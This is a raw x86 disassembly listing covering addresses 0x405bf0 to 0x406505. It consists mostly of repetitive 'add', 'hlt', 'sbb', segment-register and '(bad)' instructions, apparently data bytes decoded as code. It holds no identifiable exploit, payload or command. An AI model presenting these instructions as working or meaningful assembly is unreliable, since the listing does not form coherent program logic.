  405bf0:	add    al,0x22
  405bf2:	add    al,0xfd
  405bf4:	add    al,0x22
  405bf6:	add    eax,0x39204fd
  405bfb:	in     eax,dx
  405bfc:	add    al,0x92
  405bfe:	add    al,0xed
  405c00:	add    al,0xc2
  405c02:	add    edi,ebp
  405c04:	add    al,0xc2
  405c06:	add    al,0xfd
  405c08:	add    al,0x32
  405c0a:	add    ebp,ebp
  405c0c:	add    al,0x32
  405c0e:	add    al,0xed
  405c10:	add    al,0xee
  405c12:	add    edi,ebp
  405c14:	add    al,0xe6
  405c16:	add    al,0x0
	...
  405c30:	std    
  405c31:	add    al,0x6e
  405c33:	add    ebp,ebp
  405c35:	add    al,0x66
  405c37:	add    al,0xed
  405c39:	add    al,0xae
  405c3b:	add    edi,ebp
  405c3d:	add    al,0xa6
  405c3f:	add    al,0xfd
  405c41:	add    al,0x0
  405c43:	test   DWORD PTR cs:[ebx],0xbf02600
  405c4a:	add    BYTE PTR [esi],cl
  405c4c:	clc    
  405c4d:	or     eax,0xdf70600
  405c52:	add    BYTE PTR [esi-0x79fff208],cl
  405c58:	test   DWORD PTR ds:0xdf84e00,0xdf74600
  405c62:	add    dh,cl
  405c64:	clc    
  405c65:	or     eax,0xdf7c600
  405c6a:	add    dh,bh
  405c6c:	test   DWORD PTR ds:0xdf6f600,0xdf87e00
  405c76:	add    BYTE PTR [esi-0x9],dh
  405c79:	or     eax,0xdf81e00
  405c7e:	add    BYTE PTR [esi],dl
  405c80:	test   DWORD PTR ds:0xdf89e00,0xdf79600
  405c8a:	add    BYTE PTR [esi],bl
  405c8c:	clc    
  405c8d:	or     eax,0xdf71600
  405c92:	add    BYTE PTR [esi+0x0],bl
	...
  405cac:	add    al,bh
  405cae:	or     eax,0xdf79600
  405cb3:	add    BYTE PTR [esi-0x49fff209],bh
  405cb9:	test   BYTE PTR ds:0xdf83e00,0x0
  405cc0:	test   DWORD PTR ss:0xdf7f600,0xdf6ee00
  405ccb:	add    BYTE PTR [esi-0x8],ah
  405cce:	or     eax,0xdf75e00
  405cd3:	add    BYTE PTR [eax],al
  405cd5:	dec    edx
  405cd6:	add    al,0x9
  405cd8:	add    BYTE PTR [edx+0x3],bl
  405cdb:	or     DWORD PTR [eax],eax
  405cdd:	fimul  DWORD PTR [eax]
  405cdf:	or     DWORD PTR [eax],eax
  405ce1:	fiadd  DWORD PTR [ebx]
  405ce3:	or     DWORD PTR [eax],eax
  405ce5:	or     cl,BYTE PTR [ecx]
  405ce7:	or     DWORD PTR [eax],eax
  405ce9:	cli    
  405cea:	add    ecx,DWORD PTR [ecx]
  405cec:	add    BYTE PTR [edx+0x3],bh
  405cef:	or     DWORD PTR [eax],eax
  405cf1:	pop    edx
  405cf2:	add    ecx,DWORD PTR [ecx]
  405cf4:	add    BYTE PTR [edx],ch
  405cf6:	or     DWORD PTR [ecx],ecx
  405cf8:	add    BYTE PTR [edx],bh
  405cfa:	add    al,0x9
  405cfc:	add    BYTE PTR [edx+0x7a000903],bh
  405d02:	add    cl,BYTE PTR [ecx]
  405d04:	add    dl,bh
  405d06:	or     BYTE PTR [ecx],cl
  405d08:	add    BYTE PTR [edx+0x2a000902],ch
  405d0e:	add    al,0x9
	...
  405d28:	add    BYTE PTR [eax],al
  405d2a:	or     al,BYTE PTR [ebx]
  405d2c:	or     DWORD PTR [eax],eax
  405d2e:	fimul  DWORD PTR [eax]
  405d30:	or     DWORD PTR [eax],eax
  405d32:	jmp    0x903:0x6a000903
  405d39:	add    BYTE PTR [edx+0x2],ch
  405d3c:	or     DWORD PTR [eax],eax
  405d3e:	sbb    cl,BYTE PTR [ecx]
  405d40:	or     DWORD PTR [eax],eax
  405d42:	or     al,BYTE PTR [ecx+ecx*1]
  405d45:	add    BYTE PTR [edx+0x6a000903],cl
  405d4b:	add    cl,BYTE PTR [ecx]
  405d4d:	add    BYTE PTR [edx],bh
  405d4f:	add    ecx,DWORD PTR [ecx]
  405d51:	add    BYTE PTR [edx+0xa000902],cl
  405d57:	add    al,0x9
  405d59:	add    BYTE PTR [edx],cl
  405d5b:	add    ecx,DWORD PTR [ecx]
  405d5d:	add    BYTE PTR ds:0x5d000703,bl
  405d63:	add    eax,DWORD PTR [edi]
  405d65:	add    ah,dh
  405d67:	dec    ebp
  405d68:	add    eax,DWORD PTR [edi]
  405d6a:	hlt    
  405d6b:	lea    eax,[ebx]
  405d6d:	pop    es
  405d6e:	hlt    
  405d6f:	pop    ebp
  405d70:	add    eax,DWORD PTR [edi]
  405d72:	hlt    
  405d73:	popf   
  405d74:	add    eax,DWORD PTR [edi]
  405d76:	hlt    
  405d77:	mov    ebp,0xfdf40703
  405d7c:	add    al,BYTE PTR [edi]
  405d7e:	hlt    
  405d7f:	jae    0x405d84
  405d81:	pop    es
  405d82:	hlt    
  405d83:	xor    eax,DWORD PTR [edi+eax*1]
  405d86:	hlt    
  405d87:	add    eax,DWORD PTR [edi+eax*1]
  405d8a:	hlt    
  405d8b:	ret    
  405d8c:	add    eax,DWORD PTR [edi]
	...
  405da6:	add    ah,dh
  405da8:	arpl   WORD PTR [ebx],ax
  405daa:	pop    es
  405dab:	hlt    
  405dac:	and    eax,DWORD PTR [edi+eax*1]
  405daf:	hlt    
  405db0:	jae    0x405db5
  405db2:	pop    es
  405db3:	hlt    
  405db4:	xor    eax,DWORD PTR [edi+eax*1]
  405db7:	hlt    
  405db8:	outs   dx,DWORD PTR ds:[esi]
  405db9:	add    eax,DWORD PTR [edi]
  405dbb:	hlt    
  405dbc:	daa    
  405dbd:	add    al,0x7
  405dbf:	hlt    
  405dc0:	dec    edi
  405dc1:	add    eax,DWORD PTR [edi]
  405dc3:	hlt    
  405dc4:	pop    es
  405dc5:	add    al,0x7
  405dc7:	hlt    
  405dc8:	pop    edi
  405dc9:	add    eax,DWORD PTR [edi]
  405dcb:	hlt    
  405dcc:	pop    ss
  405dcd:	add    al,0x7
  405dcf:	hlt    
  405dd0:	mov    edi,0x77f40703
  405dd5:	add    eax,DWORD PTR [edi]
  405dd7:	hlt    
  405dd8:	push   0x3
  405dda:	or     ah,dh
  405ddc:	jmp    0x803:0xaaf40803
  405de3:	hlt    
  405de4:	sub    al,BYTE PTR [eax+ecx*1]
  405de7:	hlt    
  405de8:	or     al,BYTE PTR [eax+ecx*1]
  405deb:	hlt    
  405dec:	mov    al,BYTE PTR [eax+ecx*1]
  405def:	hlt    
  405df0:	dec    edx
  405df1:	add    ecx,DWORD PTR [eax]
  405df3:	hlt    
  405df4:	retf   0x803
  405df7:	hlt    
  405df8:	add    al,0xe9
  405dfa:	add    esi,ecx
  405dfc:	add    al,0xf9
  405dfe:	add    edi,ecx
  405e00:	add    al,0xe1
  405e02:	add    esi,ecx
  405e04:	add    al,0xf1
  405e06:	add    edi,ecx
  405e08:	add    al,0xed
  405e0a:	add    eax,DWORD PTR [eax]
	...
  405e24:	icebp  
  405e25:	add    al,0xd5
  405e27:	add    edi,ecx
  405e29:	add    al,0xe5
  405e2b:	add    esi,ecx
  405e2d:	add    al,0xcd
  405e2f:	add    edi,ecx
  405e31:	add    al,0xeb
  405e33:	add    esi,ecx
  405e35:	add    al,0xfb
  405e37:	add    edi,ecx
  405e39:	add    al,0xe3
  405e3b:	add    esi,ecx
  405e3d:	add    al,0xf3
  405e3f:	add    edi,ecx
  405e41:	add    al,0xef
  405e43:	add    esi,ecx
  405e45:	add    al,0xd7
  405e47:	add    edi,ecx
  405e49:	add    al,0xe7
  405e4b:	add    esi,ecx
  405e4d:	add    al,0xcf
  405e4f:	add    edi,ecx
  405e51:	add    al,0xe8
  405e53:	add    esi,ecx
  405e55:	add    al,0xf8
  405e57:	add    edi,ecx
  405e59:	add    al,0xe0
  405e5b:	add    esi,ecx
  405e5d:	add    al,0xf0
  405e5f:	add    edi,ecx
  405e61:	add    al,0xec
  405e63:	add    esi,ecx
  405e65:	add    al,0xd4
  405e67:	add    edi,ecx
  405e69:	add    al,0xe4
  405e6b:	add    esi,ecx
  405e6d:	add    al,0xcc
  405e6f:	add    edi,ecx
  405e71:	add    al,0xea
  405e73:	add    esi,ecx
  405e75:	add    al,0xfa
  405e77:	add    edi,ecx
  405e79:	add    al,0xe2
  405e7b:	add    esi,ecx
  405e7d:	add    al,0xf2
  405e7f:	add    edi,ecx
  405e81:	add    al,0xee
  405e83:	add    esi,ecx
  405e85:	add    al,0xd6
  405e87:	add    eax,DWORD PTR [eax]
	...
  405ea1:	stc    
  405ea2:	add    al,0x0
  405ea4:	jmp    0xe5436199
  405ea9:	sti    
  405eaa:	pop    es
  405eab:	add    eax,0x606fdef
  405eb0:	out    0xee,al
  405eb2:	add    eax,0xcefe107
  405eb7:	or     cl,ah
  405eb9:	dec    DWORD PTR [eax+ecx*1]
  405ebc:	lock clc 
  405ebe:	or     ecx,DWORD PTR [ecx]
  405ec0:	lock lock or ecx,DWORD PTR [ecx]
  405ec4:	jecxz  0x405eaf
  405ec6:	or     cl,BYTE PTR [edx]
  405ec8:	jecxz  0x405ecb
  405eca:	(bad)  
  405ecc:	repz stc 
  405ece:	push   cs
  405ecf:	or     dh,bl
  405ed1:	icebp  
  405ed2:	push   cs
  405ed3:	or     ah,dl
  405ed5:	call   0x12269e9
  405eda:	adc    BYTE PTR [ebx],cl
  405edc:	repnz clc 
  405ede:	ud2    
  405ee0:	repnz lock ud2 
  405ee4:	in     eax,0xeb
  405ee6:	or     BYTE PTR [ebx*8-0xaf3f6fd],cl
  405eed:	sti    
  405eee:	or     BYTE PTR [ebp*8-0x1af3f70d],cl
  405ef5:	jmp    0x405eff
  405ef7:	or     al,0xdd
  405ef9:	add    ecx,DWORD PTR [ecx]
  405efb:	or     al,0xf5
  405efd:	sti    
  405efe:	or     BYTE PTR [ebp*8-0x1bf3f70d],cl
	...
  405f1d:	add    dl,ch
  405f1f:	or     DWORD PTR ds:0xd0a02dc,ecx
  405f25:	hlt    
  405f26:	cli    
  405f27:	or     DWORD PTR ds:0xd09f2ec,ecx
  405f2d:	in     al,0xea
  405f2f:	or     DWORD PTR ds:0xd0a02dc,ecx
  405f35:	add    BYTE PTR [eax+0xb],al
  405f38:	or     eax,0xd0b500d
  405f3d:	or     eax,0xe0e1653
  405f42:	push   ebx
  405f43:	push   ss
  405f44:	push   cs
  405f45:	push   cs
  405f46:	and    edx,DWORD PTR [esi]
  405f48:	push   cs
  405f49:	push   cs
  405f4a:	adc    edx,DWORD PTR [esi]
  405f4c:	push   cs
  405f4d:	push   cs
  405f4e:	adc    edx,DWORD PTR [esi]
  405f50:	push   cs
  405f51:	push   cs
  405f52:	xor    edx,DWORD PTR [esi]
  405f54:	push   cs
  405f55:	push   cs
  405f56:	add    edx,DWORD PTR [esi]
  405f58:	push   cs
  405f59:	push   cs
  405f5a:	adc    edx,DWORD PTR [esi]
  405f5c:	push   cs
  405f5d:	push   cs
  405f5e:	adc    edx,DWORD PTR [esi]
  405f60:	push   cs
  405f61:	push   cs
  405f62:	rcl    DWORD PTR ds:0x15e30e0e,cl
  405f68:	push   cs
  405f69:	push   cs
  405f6a:	rcl    DWORD PTR ds:0x15d30e0e,cl
  405f70:	push   cs
  405f71:	push   cs
  405f72:	mov    bl,0x15
  405f74:	push   cs
  405f75:	push   cs
  405f76:	ret    
  405f77:	adc    eax,0x15d30e0e
  405f7c:	push   cs
  405f7d:	push   cs
  405f7e:	rcl    BYTE PTR [edi+ecx*1],cl
  405f81:	sldt   WORD PTR [eax]
	...
  405f98:	add    BYTE PTR [eax],al
  405f9a:	add    dl,dl
  405f9c:	adc    al,0xf
  405f9e:	cpuid  
  405fa0:	adc    al,0xf
  405fa2:	setb   BYTE PTR [edi+ecx*1]
  405fa6:	setb   BYTE PTR [edi+ecx*1]
  405faa:	lss    edx,FWORD PTR [edi+ecx*1]
  405fae:	jb     0x924f6ec8
  405fb4:	adc    al,0xf
  405fb6:	setb   BYTE PTR [edi+ecx*1]
  405fba:	rsqrtps xmm2,XMMWORD PTR [edi+ecx*1]
  405fbe:	punpckldq mm2,DWORD PTR [edi+ecx*1]
  405fc2:	rsqrtps xmm2,XMMWORD PTR [edi+ecx*1]
  405fc6:	pmuludq mm4,QWORD PTR [edx+0x10]
  405fca:	lsl    ebx,WORD PTR [ebx+0x10]
  405fce:	psubq  mm6,QWORD PTR [edx+0x10]
  405fd2:	psllq  mm5,QWORD PTR [edx+0x10]
  405fd6:	por    mm5,QWORD PTR [ebp+0x3]
  405fda:	adc    BYTE PTR ds:0x7131560,al
  405fe0:	jp     0x405ff9
  405fe2:	adc    al,0x8
  405fe4:	jno    0x405ffc
  405fe6:	adc    eax,0x16197c01
  405feb:	jmp    0x185a:0xe2161973
  405ff2:	pop    ss
  405ff3:	jmp    0x406047
  405ff5:	sbb    BYTE PTR [edi],dl
  405ff7:	jecxz  0x40604e
  405ff9:	sbb    ebx,DWORD PTR [eax]
  405ffb:	or     al,0x54
  405ffd:	sbb    ebx,DWORD PTR [eax]
	...
  406017:	add    BYTE PTR [esp+eax*1],cl
  40601a:	sbb    al,0x18
  40601c:	cld    
  40601d:	add    ebx,DWORD PTR [eax+ebx*1]
  406020:	cld    
  406021:	je     0x40603f
  406023:	sbb    ebp,ebp
  406025:	je     0x406043
  406027:	sbb    ebp,ebp
  406029:	fs sbb al,0x19
  40602c:	frstor [esp+ebx*1+0x19]
  406030:	fst    QWORD PTR [ebp+0x19]
  406033:	sbb    cl,BYTE PTR [esi]
  406035:	push   esi
  406036:	sbb    DWORD PTR [edx],ebx
  406038:	push   cs
  406039:	push   es
  40603a:	sbb    bl,BYTE PTR [edx]
  40603c:	inc    BYTE PTR ds:0x75fe1a1a
  406042:	sbb    DWORD PTR [edx],ebx
  406044:	out    dx,al
  406045:	jne    0x406060
  406047:	sbb    ch,dh
  406049:	sbb    DWORD PTR gs:[edx],ebx
  40604c:	fisub  WORD PTR [ebp+0x19]
  40604f:	sbb    bl,dh
  406051:	push   esi
  406052:	sbb    bl,BYTE PTR [ebx]
  406054:	xorps  xmm3,XMMWORD PTR [edx]
  406057:	sbb    ecx,DWORD PTR [edi]
  406059:	add    eax,0x1dff1b02
  40605e:	add    bl,BYTE PTR [ebx]
  406060:	call   FWORD PTR ds:0x1def1af2
  406066:	repnz sbb ch,bh
  406069:	sbb    eax,0x1ddf1ae2
  40606e:	loop   0x40608a
  406070:	fistp  WORD PTR ds:0x19101fd5
  406076:	int    0x1f
  406078:	or     BYTE PTR [ecx],bl
  40607a:	add    eax,0x20
	...
  406093:	add    BYTE PTR [eax],al
  406095:	add    BYTE PTR [ecx],bl
  406097:	std    
  406098:	pop    ds
  406099:	clc    
  40609a:	sbb    ch,dh
  40609c:	pop    ds
  40609d:	lock sbb ch,ch
  4060a0:	pop    ds
  4060a1:	call   0xe06045be
  4060a6:	sbb    ch,bl
  4060a8:	pop    ds
  4060a9:	fcomp  DWORD PTR [eax]
  4060ab:	aad    0x1f
  4060ad:	adc    BYTE PTR [ecx],bl
  4060af:	int    0x1f
  4060b1:	or     BYTE PTR [ecx],bl
  4060b3:	add    eax,0xfd190020
  4060b8:	pop    ds
  4060b9:	clc    
  4060ba:	sbb    ch,dh
  4060bc:	pop    ds
  4060bd:	lock sbb ch,ch
  4060c0:	pop    ds
  4060c1:	call   0xe06045de
  4060c6:	sbb    ch,bl
  4060c8:	pop    ds
  4060c9:	fcomp  DWORD PTR [eax]
  4060cb:	aam    0x20
  4060cd:	adc    DWORD PTR [eax],ebx
  4060cf:	int3   
  4060d0:	and    BYTE PTR [ecx],cl
  4060d2:	sbb    BYTE PTR [ecx+eiz*1],al
  4060d5:	add    DWORD PTR [eax],ebx
  4060d7:	cld    
  4060d8:	and    cl,bh
  4060da:	pop    ss
  4060db:	hlt    
  4060dc:	and    cl,dh
  4060de:	pop    ss
  4060df:	in     al,dx
  4060e0:	and    cl,ch
  4060e2:	pop    ss
  4060e3:	in     al,0x20
  4060e5:	loope  0x4060fe
  4060e7:	fsub   QWORD PTR [eax]
  4060e9:	fst    DWORD PTR [edi]
  4060eb:	add    ah,dl
  4060ed:	adc    al,0x18
  4060ef:	sbb    eax,0x1d1814cc
  4060f4:	add    al,0x15
  4060f6:	sbb    BYTE PTR ds:0xfc,bl
	...
  406110:	add    BYTE PTR [eax],al
  406112:	adc    al,0x18
  406114:	sbb    eax,0x1d1814f4
  406119:	in     al,dx
  40611a:	adc    al,0x18
  40611c:	sbb    eax,0x1d1814e4
  406121:	fcom   QWORD PTR [eax+ebx*1]
  406124:	sbb    eax,0x306f8e9
  406129:	in     eax,0xfc
  40612b:	add    al,BYTE PTR [edi]
  40612d:	icebp  
  40612e:	out    dx,eax
  40612f:	or     ecx,DWORD PTR [ecx]
  406131:	repz in eax,dx
  406133:	or     eax,0x903e50b
  406138:	or     al,0xdc
  40613a:	in     al,0x7
  40613c:	or     eax,0xe0af1f7
  406141:	out    dx,al
  406142:	jmp    0x1015:0x7d90f09
  406149:	fld    DWORD PTR [edi]
  40614b:	adc    eax,0x1606f810
  406150:	adc    eax,edi
  406152:	push   es
  406153:	push   ss
  406154:	adc    ebx,edi
  406156:	in     eax,0x12
  406158:	adc    bh,bl
  40615a:	in     eax,0x12
  40615c:	adc    bl,dl
  40615e:	in     al,0x13
  406160:	adc    ebx,edx
  406162:	in     al,0x13
  406164:	adc    ebx,ebp
  406166:	or     edx,DWORD PTR [ecx]
  406168:	adc    al,0xd5
  40616a:	add    edx,DWORD PTR [ecx]
  40616c:	adc    al,0xfd
  40616e:	or     edx,DWORD PTR [ecx]
  406170:	adc    al,0xf5
  406172:	add    edx,DWORD PTR [ecx]
  406174:	adc    al,0xfc
	...
  40618e:	add    dl,ch
  406190:	adc    DWORD PTR ds:0x1511e2f4,edx
  406196:	add    BYTE PTR [eax-0x5feaeaf1],ah
  40619c:	unpckhps xmm2,XMMWORD PTR ds:0x16161253
  4061a3:	inc    ebx
  4061a4:	adc    dl,BYTE PTR [esi]
  4061a6:	push   ss
  4061a7:	arpl   WORD PTR [edx],dx
  4061a9:	push   ss
  4061aa:	push   ss
  4061ab:	arpl   WORD PTR [edx],dx
  4061ad:	push   ss
  4061ae:	push   ss
  4061af:	push   edx
  4061b0:	adc    DWORD PTR [edi],edx
  4061b2:	pop    ss
  4061b3:	inc    edx
  4061b4:	adc    DWORD PTR [edi],edx
  4061b6:	pop    ss
  4061b7:	and    dl,BYTE PTR [ecx]
  4061b9:	pop    ss
  4061ba:	pop    ss
  4061bb:	and    dl,BYTE PTR [ecx]
  4061bd:	pop    ss
  4061be:	pop    ss
  4061bf:	inc    ebp
  4061c0:	sbb    al,0x18
  4061c2:	sbb    BYTE PTR [ebp+0x1c],al
  4061c5:	sbb    BYTE PTR [eax],bl
  4061c7:	cmc    
  4061c8:	sbb    BYTE PTR [eax],bl
  4061ca:	sbb    ch,dh
  4061cc:	sbb    BYTE PTR [eax],bl
  4061ce:	sbb    BYTE PTR ds:0x518181c,al
  4061d4:	sbb    al,0x18
  4061d6:	sbb    BYTE PTR ds:0x1518181c,dl
  4061dc:	sbb    al,0x18
  4061de:	sbb    ah,al
  4061e0:	sbb    bl,BYTE PTR [ecx]
  4061e2:	sbb    esp,eax
  4061e4:	sbb    bl,BYTE PTR [ecx]
  4061e6:	sbb    esp,esi
  4061e8:	sbb    ebx,DWORD PTR [ecx]
  4061ea:	sbb    esp,esi
  4061ec:	sbb    ebx,DWORD PTR [ecx]
  4061ee:	sbb    esp,eax
  4061f0:	sbb    bl,BYTE PTR [ecx]
  4061f2:	sbb    DWORD PTR [eax],eax
	...
  40620c:	les    ebx,FWORD PTR [edx]
  40620e:	sbb    DWORD PTR [ecx],ebx
  406210:	aam    0x1a
  406212:	sbb    DWORD PTR [ecx],ebx
  406214:	aam    0x1a
  406216:	sbb    DWORD PTR [ecx],ebx
  406218:	(bad)  
  406219:	sbb    eax,0x1dc71a1a
  40621e:	sbb    bl,BYTE PTR [edx]
  406220:	neg    DWORD PTR [edx]
  406222:	sbb    bl,BYTE PTR [edx]
  406224:	neg    DWORD PTR [edx]
  406226:	sbb    bl,BYTE PTR [edx]
  406228:	hlt    
  406229:	jae    0x406244
  40622b:	sbb    ch,dh
  40622d:	jae    0x406248
  40622f:	sbb    bl,dh
  406231:	arpl   WORD PTR [ecx],bx
  406233:	sbb    bl,dh
  406235:	arpl   WORD PTR [ecx],bx
  406237:	sbb    cl,BYTE PTR [esi]
  406239:	push   ebx
  40623a:	sbb    BYTE PTR [ebx],bl
  40623c:	rcpps  xmm3,XMMWORD PTR [eax]
  40623f:	sbb    edi,edi
  406241:	add    bl,BYTE PTR [ecx]
  406243:	sbb    edi,edi
  406245:	add    bl,BYTE PTR [ecx]
  406247:	sbb    ebp,edi
  406249:	jb     0x406263
  40624b:	sbb    ebp,edi
  40624d:	jb     0x406267
  40624f:	sbb    ebx,edi
  406251:	bound  ebx,QWORD PTR [eax]
  406253:	sbb    ebx,edi
  406255:	bound  ebx,QWORD PTR [eax]
  406257:	sbb    edx,DWORD PTR [eax]
  406259:	outs   dx,BYTE PTR ds:[esi]
  40625a:	add    eax,DWORD PTR [eax]
  40625c:	hlt    
  40625d:	ins    BYTE PTR es:[edi],dx
  40625e:	add    eax,DWORD PTR [eax]
  406260:	hlt    
  406261:	imul   eax,DWORD PTR [ebx],0x0
  406264:	hlt    
  406265:	push   0x3
  406267:	add    ah,dh
  406269:	imul   eax,DWORD PTR [ebx],0x360f400
	...
  406287:	add    BYTE PTR [eax],al
  406289:	hlt    
  40628a:	add    eax,DWORD PTR [bx+si]
  40628d:	hlt    
  40628e:	pop    esi
  40628f:	add    eax,DWORD PTR [eax]
  406291:	hlt    
  406292:	arpl   WORD PTR [ebx],ax
  406294:	add    ah,dh
  406296:	popa   
  406297:	add    eax,DWORD PTR [eax]
  406299:	hlt    
  40629a:	outs   dx,DWORD PTR ds:[esi]
  40629b:	add    eax,DWORD PTR [eax]
  40629d:	hlt    
  40629e:	add    eax,DWORD PTR gs:[eax]
  4062a1:	hlt    
  4062a2:	jnp    0x4062a7
  4062a4:	add    ah,dh
  4062a6:	outs   dx,DWORD PTR ds:[esi]
  4062a7:	add    eax,DWORD PTR [eax]
  4062a9:	hlt    
  4062aa:	arpl   WORD PTR [ebx],ax
  4062ac:	add    ah,dh
  4062ae:	push   edi
  4062af:	add    eax,DWORD PTR [eax]
  4062b1:	hlt    
  4062b2:	or     eax,DWORD PTR [eax+eax*1]
  4062b5:	hlt    
  4062b6:	add    eax,DWORD PTR [eax+eax*1]
  4062b9:	hlt    
  4062ba:	add    al,0xd9
  4062bc:	add    esi,esp
  4062be:	add    al,0xe1
  4062c0:	add    esi,esp
  4062c2:	add    al,0x29
  4062c4:	add    al,0xf4
  4062c6:	add    al,0x39
  4062c8:	add    al,0xf4
  4062ca:	add    al,0x9
  4062cc:	add    al,0xf4
  4062ce:	add    al,0xf9
  4062d0:	add    esi,esp
  4062d2:	add    al,0x69
  4062d4:	add    al,0xf4
  4062d6:	add    al,0x49
  4062d8:	add    al,0xf4
  4062da:	add    al,0x29
  4062dc:	add    al,0xf4
  4062de:	add    al,0x49
  4062e0:	add    al,0xf4
  4062e2:	add    al,0xe9
  4062e4:	add    esi,esp
  4062e6:	add    al,0xe9
  4062e8:	add    esi,esp
  4062ea:	add    al,0xe9
  4062ec:	add    eax,DWORD PTR [eax]
	...
  406306:	hlt    
  406307:	add    al,0xe8
  406309:	add    esi,esp
  40630b:	add    al,0xeb
  40630d:	add    esi,esp
  40630f:	add    al,0xea
  406311:	add    esi,esp
  406313:	add    al,0xed
  406315:	add    esi,esp
  406317:	add    al,0xe7
  406319:	add    esi,esp
  40631b:	add    al,0xe1
  40631d:	add    esi,esp
  40631f:	add    al,0xdd
  406321:	add    esi,esp
  406323:	add    al,0xd9
  406325:	add    esi,esp
  406327:	add    al,0xe1
  406329:	add    esi,esp
  40632b:	add    al,0xc9
  40632d:	add    esi,esp
  40632f:	add    al,0xb9
  406331:	add    esi,esp
  406333:	add    al,0x29
  406335:	add    al,0xf4
  406337:	add    al,0x49
  406339:	add    al,0xf4
  40633b:	add    al,0x69
  40633d:	add    esi,esp
  40633f:	add    al,0xa9
  406341:	add    esi,esp
  406343:	add    al,0xe9
  406345:	add    al,0xf4
  406347:	add    al,0x69
  406349:	add    al,0xf4
  40634b:	add    al,0x0
  40634d:	jmp    0xe9406843
  406352:	cli    
  406353:	add    al,0x0
  406355:	jmp    0xea3fd8f5
  40635a:	cmc    
  40635b:	add    al,0x0
  40635d:	jmp    0xe9406861
  406362:	sti    
  406363:	add    al,0x0
  406365:	jmp    0xe9406851
	...
  406382:	add    BYTE PTR [edi],cl
  406384:	add    eax,0x517e900
  406389:	add    cl,ch
  40638b:	daa    
  40638c:	add    eax,0x7537e900
  406391:	(bad)  
  406392:	jmp    0xeb3fd8ee
  406397:	test   DWORD PTR [eax],0xfef7e400
  40639d:	(bad)  
  40639e:	in     eax,dx
  40639f:	test   DWORD PTR [eax+eax*1],0xaf7f0
  4063a6:	loop   0x40639f
  4063a8:	pop    es
  4063a9:	add    dh,bl
  4063ab:	not    DWORD PTR [ebx]
  4063ad:	add    dl,bh
  4063af:	test   DWORD PTR ds:0x15f80200,0x29f7ca00
  4063b9:	add    dl,bl
  4063bb:	idiv   DWORD PTR [ecx]
  4063bd:	add    BYTE PTR [edx-0x76002e09],ch
  4063c3:	div    edi
  4063c5:	jmp    FWORD PTR [ecx-0x9]
  4063c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c9:	add    BYTE PTR [edx],ch
  4063cb:	mul    DWORD PTR [edi+0x0]
  4063ce:	jmp    0x4063c6
  4063d0:	add    al,0x0
  4063d2:	jmp    0xf94068ce
  4063d7:	not    DWORD PTR [eax+eax*1]
  4063da:	stc    
  4063db:	not    DWORD PTR [eax+eax*1]
  4063de:	add    BYTE PTR [ebp-0x32ffeff8],bl
  4063e4:	or     BYTE PTR [eax],dl
	...
  4063fe:	add    BYTE PTR [eax],al
  406400:	int3   
  406401:	or     BYTE PTR [ecx],dl
  406403:	add    BYTE PTR [eax+ecx*1+0x89f0011],bh
  40640a:	adc    al,BYTE PTR [eax]
  40640c:	(bad)
  406410:	mov    cs,WORD PTR [eax]
  406412:	adc    eax,DWORD PTR [eax]
  406414:	jle    0x40641e
  406416:	adc    eax,DWORD PTR [eax]
  406418:	cdq    
  406419:	or     BYTE PTR [eax+eax*1],dl
  40641c:	dec    ecx
  40641d:	or     BYTE PTR [eax+eax*1],dl
  406420:	dec    eax
  406421:	or     BYTE PTR ds:0x15084800,dl
  406427:	add    BYTE PTR [ebp+0x8],bl
  40642a:	retf   
  40642b:	add    BYTE PTR [eax+0x5c000008],bl
  406431:	or     BYTE PTR [edx],al
  406433:	add    BYTE PTR [esi+0x8],cl
  406436:	add    al,0x0
  406438:	dec    eax
  406439:	or     BYTE PTR [edi],al
  40643b:	add    BYTE PTR [eax+ecx*1],ah
  40643e:	or     eax,0x19084c00
  406443:	add    ah,ch
  406445:	or     BYTE PTR [ecx],dh
  406447:	add    BYTE PTR [eax+ecx*1+0x61],cl
  40644b:	add    BYTE PTR [eax+ecx*1+0x71c00c1],bl
  406452:	add    DWORD PTR [ecx],0x3010a0c
  406458:	or     al,0x74
  40645a:	add    BYTE PTR [esi],al
  40645c:	fdiv   st(7),st
  40645e:	add    BYTE PTR [esp+ebx*8],cl
  406461:	pop    ss
  406462:	add    DWORD PTR [eax],ebx
	...
  40647c:	add    ah,cl
  40647e:	daa    
  40647f:	add    DWORD PTR [eax],esi
  406481:	int3   
  406482:	inc    edi
  406483:	add    BYTE PTR [eax-0x23],ah
  406486:	pop    es
  406487:	add    BYTE PTR [eax],al
  406489:	hlt    
  40648a:	ins    DWORD PTR es:[edi],dx
  40648b:	add    edx,DWORD PTR [eax]
  40648d:	hlt    
  40648e:	ins    DWORD PTR es:[edi],dx
  40648f:	add    edx,DWORD PTR [eax]
  406491:	hlt    
  406492:	dec    esp
  406493:	add    edx,DWORD PTR [ecx]
  406495:	hlt    
  406496:	dec    edi
  406497:	add    edx,DWORD PTR [edx]
  406499:	hlt    
  40649a:	dec    esi
  40649b:	add    edx,DWORD PTR [ebx]
  40649d:	hlt    
  40649e:	pop    ecx
  40649f:	add    edx,DWORD PTR [esp+esi*8]
  4064a2:	jo     0x4064a7
  4064a4:	adc    eax,0x16037bf4
  4064a9:	hlt    
  4064aa:	jb     0x4064af
  4064ac:	pop    ss
  4064ad:	hlt    
  4064ae:	jne    0x4064b3
  4064b0:	sbb    ah,dh
  4064b2:	add    ebx,DWORD PTR fs:[ecx]
  4064b5:	hlt    
  4064b6:	add    ebx,DWORD PTR [bp+si]
  4064b9:	hlt    
  4064ba:	push   esi
  4064bb:	add    ebx,DWORD PTR [ebx]
  4064bd:	hlt    
  4064be:	inc    ecx
  4064bf:	add    ebx,DWORD PTR [esp+esi*8]
  4064c2:	or     BYTE PTR [ebx*1+0x40039df4],al
  4064c9:	hlt    
  4064ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064cb:	jmp    0xeaf23a45
  4064d0:	arpl   WORD PTR [esi+ebp*4],dx
  4064d3:	loop   0x406546
  4064d5:	xchg   ebp,eax
  4064d6:	inc    eax
  4064d7:	fidiv  WORD PTR [ebx-0x6f]
  4064da:	scas   eax,DWORD PTR es:[edi]
  4064db:	and    esi,DWORD PTR [eax-0x6b]
  4064de:	scas   al,BYTE PTR es:[edi]
  4064df:	hlt    
  4064e0:	add    BYTE PTR fs:[eax],al
	...
  4064f7:	add    BYTE PTR [eax],al
  4064f9:	add    BYTE PTR [eax-0x2b9110c3],dl
  4064ff:	sahf   
  406500:	and    esi,DWORD PTR [edx-0x7f]
  406503:	mov    ebp,edi
  406505:	push   0x66238891
